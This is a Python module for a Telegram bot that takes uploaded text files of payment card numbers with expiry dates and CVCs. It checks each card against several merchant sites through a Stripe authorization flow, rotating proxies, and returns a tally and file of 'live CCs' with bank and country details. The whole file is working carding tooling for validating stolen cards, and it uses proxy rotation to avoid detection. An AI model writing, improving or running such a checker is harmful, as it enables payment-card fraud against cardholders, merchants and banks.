import os
import re
import asyncio
import tempfile

from telegram.helpers import escape_markdown
from telegram import InputFile

from bininfo import round_robin_bin_lookup
from auth_processor import prepare_headers, generate_uuids, check_card_across_sites
from config import TELEGRAM_BOT_TOKEN, DEFAULT_API_URL

# Utilities included here to avoid circular imports with main.py
SITE_STORAGE_FILE = "current_site.txt"


def load_current_site():
    """
    Load saved site URLs from file. Returns list of sites or default if none.
    """
    try:
        with open(SITE_STORAGE_FILE, "r", encoding="utf-8") as f:
            sites = [line.strip() for line in f if line.strip()]
            return sites if sites else [DEFAULT_API_URL]
    except FileNotFoundError:
        return [DEFAULT_API_URL]


def build_status_keyboard(card, total, processed, status, charged, cvv, ccn, low, declined, checking):
    """
    Build an inline keyboard with current processing status and controls for UI.
    """
    from telegram import InlineKeyboardButton, InlineKeyboardMarkup

    keyboard = [
        [InlineKeyboardButton(f"• {card} •", callback_data="noop")],
        [InlineKeyboardButton(f"• STATUS → {status} •", callback_data="noop")],
        [InlineKeyboardButton(f"• CVV → [ {cvv} ] •", callback_data="noop")],
        [InlineKeyboardButton(f"• CCN → [ {ccn} ] •", callback_data="noop")],
        [InlineKeyboardButton(f"• LOW FUNDS → [ {low} ] •", callback_data="noop")],
        [InlineKeyboardButton(f"• DECLINED → [ {declined} ] •", callback_data="noop")],
        [InlineKeyboardButton(f"• TOTAL → [ {total} ] •", callback_data="noop")],
    ]

    if checking:
        keyboard.append([InlineKeyboardButton(" [ STOP ] ", callback_data="stop")])
    else:
        keyboard.append([InlineKeyboardButton(" _Replace Sites_ ", callback_data="replace_site")])
        keyboard.append([InlineKeyboardButton(" _Done_ ", callback_data="done_sites")])

    return InlineKeyboardMarkup(keyboard)


async def handle_file(update, context):
    """
    Handle uploaded .txt files containing batch card data.
    Process each card using unified checking logic with detailed progress updates.
    """
    # Validate file extension
    doc = update.message.document
    if not doc or not doc.file_name.endswith(".txt"):
        await update.message.reply_text(
            "📄 Please upload a .txt file with card data in the format:\n`card|month|year|cvc`"
        )
        return

    # Download the file temporarily
    file = await update.message.document.get_file()
    local_path = os.path.join(tempfile.gettempdir(), doc.file_name)
    await file.download_to_drive(local_path)

    # Read and normalize card lines
    with open(local_path, "r") as f:
        lines = []
        for line in f:
            line = line.strip()
            if not line:
                continue
            normalized = re.sub(r'\s*\|\s*', '|', line)
            if len(normalized.split('|')) == 4:
                lines.append(normalized)

    if not lines:
        await update.message.reply_text("📄 The file is empty or contains no valid card data.")
        return

    total = len(lines)
    cvv_count = ccn_count = low_funds_count = declined_count = 0

    headers = prepare_headers()
    sites = load_current_site()
    chat_id = update.message.chat_id
    bot_token = TELEGRAM_BOT_TOKEN

    reply_msg = await update.message.reply_text(
        f"Processing 0/{total} cards...",
        reply_markup=build_status_keyboard(
            "Waiting for first card", total, 0, "Idle", 0,
            cvv_count, ccn_count, low_funds_count, declined_count, checking=True,
        ),
    )

    import proxy

    try:
        with open(local_path, "w+") as result_file:
            for idx, card in enumerate(lines, start=1):
                if context.application.bot_data.get("stop"):
                    await update.message.reply_text(f"🛑 Processing stopped at card {idx}.")
                    break

                uuids = generate_uuids()
                proxy_for_card = proxy.get_next_proxy()

                status, message, raw_card = await asyncio.get_running_loop().run_in_executor(
                    None,
                    check_card_across_sites,
                    card,
                    headers,
                    uuids,
                    chat_id,
                    bot_token,
                    sites,
                    proxy_for_card,
                )

                if status == "CVV":
                    cvv_count += 1
                    status_text = "CVV"
                elif status == "CCN":
                    ccn_count += 1
                    status_text = "CCN Live"
                elif status == "LOW_FUNDS":
                    low_funds_count += 1
                    status_text = "Insufficient Funds"
                elif status == "DECLINED":
                    declined_count += 1
                    status_text = "Declined"
                else:
                    status_text = "Unknown"

                try:
                    bin_info, bank, country = round_robin_bin_lookup(raw_card.split('|')[0])
                except Exception:
                    bin_info, bank, country = "N/A", "N/A", "N/A"

                if status in ["CVV", "CCN", "LOW_FUNDS"]:
                    result_file.write(f"{raw_card}|{status_text}\n")
                    result_file.flush()

                site_num = "N/A"
                site_search = re.search(r"Site: (\d+)", message)
                if site_search:
                    site_num = site_search.group(1)

                msg = (
                    f"CARD: {raw_card}\n"
                    f"Gateway: Stripe Auth\n"
                    f"Response: {status_text} {'✓' if status == 'CVV' else ''}\n"
                    f"Site: {site_num}\n"
                    f"Bin Info: {bin_info}\n"
                    f"Bank: {bank}\n"
                    f"Country: {country}"
                )

                await update.message.reply_text(msg, parse_mode="HTML")

                try:
                    await reply_msg.edit_text(
                        f"Processing {idx}/{total} cards...",
                        reply_markup=build_status_keyboard(
                            raw_card, total, idx, status_text, 0,
                            cvv_count, ccn_count, low_funds_count, declined_count,
                            checking=True,
                        ),
                    )
                except Exception:
                    pass

    finally:
        await update.message.reply_text("✅ Finished processing all cards.")
        try:
            await reply_msg.delete()
        except Exception:
            pass

        if os.path.exists(local_path):
            try:
                await update.message.reply_document(
                    InputFile(local_path, filename=os.path.basename(local_path)),
                    caption=f"📊 Results ({cvv_count + ccn_count + low_funds_count} live CCs found)",
                )
            except Exception:
                pass

            try:
                os.remove(local_path)
            except Exception:
                pass
